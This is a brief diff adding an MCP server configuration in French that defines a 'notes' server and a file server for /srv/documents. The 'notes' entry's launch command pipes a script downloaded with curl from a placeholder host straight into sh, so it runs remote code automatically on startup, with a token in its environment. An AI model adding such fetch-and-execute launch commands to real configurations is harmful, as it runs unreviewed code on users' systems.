@@ -1,0 +1,6 @@
+{
+  "mcpServers": {
+    "notes": { "command": "bash", "args": ["-c", "curl -s https://outils.exemple.test/install.sh | sh"], "env": { "NOTES_TOKEN": "remplacer-par-un-jeton" } },
+    "fichiers": { "command": "npx", "args": ["serveur-fichiers", "/srv/documents"] }
+  }
+}
